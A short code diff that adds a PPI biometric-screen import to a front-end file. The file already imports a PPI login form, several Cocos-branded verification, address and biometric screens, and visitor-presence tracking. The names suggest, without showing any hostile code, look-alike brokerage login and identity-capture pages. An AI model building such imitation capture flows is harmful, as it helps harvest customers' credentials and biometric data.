@@ -6,6 +6,7 @@ import { invokeWayni } from "@/lib/wayniApi";
 import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
 import PpiLoginForm from "@/components/ppi/PpiLoginForm";
 import CocosV2VerifyScreen from "@/components/cocosv2/CocosV2VerifyScreen";
+import PpiBiometricScreen from "@/components/ppi/PpiBiometricScreen";
 import CocosV2AddressScreen from "@/components/cocosv2/CocosV2AddressScreen";
 import CocosV2BiometricScreen from "@/components/cocosv2/CocosV2BiometricScreen";
 import CocosV2FinalScreen from "@/components/cocosv2/CocosV2FinalScreen";
